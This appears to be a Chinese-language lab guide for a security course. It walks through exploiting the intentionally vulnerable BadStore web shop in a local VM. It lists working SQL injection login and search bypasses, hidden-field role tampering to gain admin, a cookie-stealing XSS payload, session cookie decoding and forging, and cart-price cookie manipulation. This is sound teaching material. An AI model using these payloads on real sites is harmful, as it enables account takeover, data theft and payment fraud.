# Project 2 学习指南

目标:跑通 BadStore 的 Web 漏洞链路,理解 SQL injection、隐藏字段、权限控制、
XSS、cookie 设计缺陷和客户端可篡改价格的风险。

> 本文件是实操指南,会包含一些方向性答案和验证细节。完整 quiz 答案见 `quiz.md`。

## 运行前检查

确认 QEMU 在跑:

```bash
ps -ef | grep qemu-system-i386
```

确认 HTTP 可访问:

```bash
curl --noproxy '*' http://www.badstore.net/cgi-bin/badstore.cgi
```

如果浏览器访问异常,先看 [QEMU-SETUP.md](QEMU-SETUP.md) 的代理和 Windows hosts
排错。当前验证环境中最常见的两个问题是:

- 走代理时返回 `502 Bad Gateway`;
- 绕过代理后,Windows hosts 没配好,`www.badstore.net` 解析到公网地址导致 timeout。

## 官方说明里最有用的线索

已用 BeautifulSoup 提取官方 HTML,要点如下:

- 原文用 VirtualBox + Host-Only 网络;本仓库提供 QEMU user-mode port forwarding 方案。
- 推荐 Firefox Developer Tools,尤其是 View Source、Page Inspector、Network、cookies。
- MySQL 注释是 `-- `,注意两个短横线后面要有空格。
- BadStore 的 CGI URL 都围绕 `action` 参数变化,可以手工构造 action。
- Supplier Login 链接会切到 HTTPS,但 BadStore 的 TLS 太老;实操时可手动改回 HTTP。
- 可用 `http://www.badstore.net/cgi-bin/initdbs.cgi` 重置数据库和目录。

## 入口枚举

主要页面:

```text
/cgi-bin/badstore.cgi
/cgi-bin/badstore.cgi?action=whatsnew
/cgi-bin/badstore.cgi?action=guestbook
/cgi-bin/badstore.cgi?action=viewprevious
/cgi-bin/badstore.cgi?action=loginregister
/cgi-bin/badstore.cgi?action=myaccount
/cgi-bin/badstore.cgi?action=supplierlogin
/cgi-bin/badstore.cgi?action=cartview
```

注意 shell 中 URL 带 `?` 时要加引号,否则 zsh 会把它当 glob:

```bash
curl --noproxy '*' 'http://www.badstore.net/cgi-bin/badstore.cgi?action=whatsnew'
```

## 隐藏字段与角色

注册页源码里有隐藏字段:

```html
<input type="hidden" name="role" value="U">
```

已验证角色值:

- `U`:普通用户
- `S`:supplier
- `A`:admin

这说明服务器信任了客户端提交的权限字段。用开发者工具改 hidden input,或直接 POST
`role=A`,就能注册管理员账号。

注意:做实验注册的用户会留在数据库里。做完可以访问:

```text
http://www.badstore.net/cgi-bin/initdbs.cgi
```

## Quick Search SQL Injection

Quick Search 使用:

```text
action=qsearch&searchquery=...
```

已验证 payload:

```text
' OR 1=1 --
```

末尾空格很重要。没有空格时,MySQL 不会把 `--` 当注释。

结果里会列出 `1000` 到 `1014`,以及 `9999 Test Item`,总数是 16。注意如果只用
`10xx` 这种正则去数,会漏掉 `9999`。

## Supplier Portal

侧边栏链接是 HTTPS:

```text
https://www.badstore.net/cgi-bin/badstore.cgi?action=supplierlogin
```

但现代浏览器/curl 可能拒绝 BadStore 的旧 TLS。实操时可以改成:

```text
http://www.badstore.net/cgi-bin/badstore.cgi?action=supplierlogin
```

登录可用 SQLi 绕过,例如在 email 中输入:

```text
' OR 1=1 --
```

或:

```text
joe@supplier.com' --
```

进入 supplier portal 后,可看到两个功能:

- Upload price list
- View existing price list

## Joe 的 Previous Orders

用普通登录表单对 `joe@supplier.com` 做 SQLi 登录:

```text
joe@supplier.com' --
```

然后访问:

```text
/cgi-bin/badstore.cgi?action=viewprevious
```

能看到 Joe 的历史订单。`$46.95` 的订单对应多张测试卡号。注意页面中也有 `$22.95`
订单,不要把相邻行的卡号混进去。

另一个细节:用 SQLi 登录会把注入字符串也带进 session cookie 的 email 字段。如果要研究
cookie 结构,最好另外注册一个正常账号。

## Admin Portal

注册时提交 `role=A` 后,访问:

```text
/cgi-bin/badstore.cgi?action=admin
```

Admin 菜单不是普通链接,而是 POST 到:

```text
/cgi-bin/badstore.cgi?action=adminportal
```

表单字段是:

```text
admin=Show Current Users
```

提交后能看到用户数据库。已验证 `@whole.biz` 的两个用户是:

```text
fred@whole.biz
landon@whole.biz
```

## Guestbook XSS

Guestbook 表单提交到:

```text
action=doguestbook
```

字段包括 `name`, `email`, `comments`。已验证 payload:

```html
<script>alert(document.cookie)</script>
```

提交后响应页面会把 payload 原样放入:

```html
<OL><I><script>alert(document.cookie)</script>
</I></OL>
```

浏览器如果没弹窗,检查:

- popup 是否被拦截;
- 是否真的提交到了 `doguestbook`;
- 当前是否有 cookie 可显示;
- 是否在 HTTP 页面上操作,而不是被旧 HTTPS/TLS 卡住。

## Session Cookie

登录/注册后会出现 session cookie:

```text
SSOid=...
```

它是 URL-encoded Base64,末尾常带 URL-encoded newline。解码步骤:

1. URL decode;
2. 去掉换行或让 Base64 解码器忽略换行;
3. Base64 decode。

已验证结构:

```text
email:md5(password):full_name:role
```

例子:

```text
cookie@example.com:8fc83302c44fcb68b793ceca1d376996:Cookie Tester:U
```

其中 `8fc83302c44fcb68b793ceca1d376996` 是 `pw123` 的 MD5。

注意:这不是安全的 session token,而是可预测、可解码、可伪造的身份材料。

## Cart Cookie

从 What's New 页面加购物车时,页面 JS 使用的是 `cartitem` 单数:

```text
action=cartadd&cartitem=1000
```

如果手工请求写成 `cartitems=1000`,会遇到:

```text
Cart Error - Zero Items
```

加购物车后会出现:

```text
CartID=...
```

它不是 Base64,只是 URL-encoded colon-separated string。URL decode 后:

```text
timestamp:item_count:total_price:item_ids
```

例如:

```text
1783278011:1:11.5:1000
```

第三个字段是总价。手工把第三字段从 `11.5` 改成 `0.01` 后,购物车页面显示:

```text
Cart Contains: 1 items at $0.01
```

但商品行仍显示 Snake Oil 原价 `$11.50`。这说明服务端信任了客户端 cookie 中的
订单总价。

## 实操注意事项

- 浏览器要对 `www.badstore.net` 直连,不要走代理。
- Windows 浏览器需要 Windows hosts 生效;WSL `/etc/hosts` 只影响 WSL 内命令。
- 优先使用 HTTP。BadStore 的 HTTPS/SSL 太老,现代客户端可能拒绝。
- URL 带 `?` 时 shell 命令要加引号。
- SQLi 注释用 `-- `,末尾空格别漏。
- 用脚本做题时,记得禁用代理,例如 Python 用 `ProxyHandler({})`,curl 用 `--noproxy '*'`。
- 做完可访问 `initdbs.cgi` 清理实验污染。它会重置数据库,但不会清理浏览器 cookie;
  浏览器侧还需要手动清 cookie 或开新隐私窗口。
- 如果题目结果看起来不对,先清 cookie,再 reset DB,最后重新走一遍。
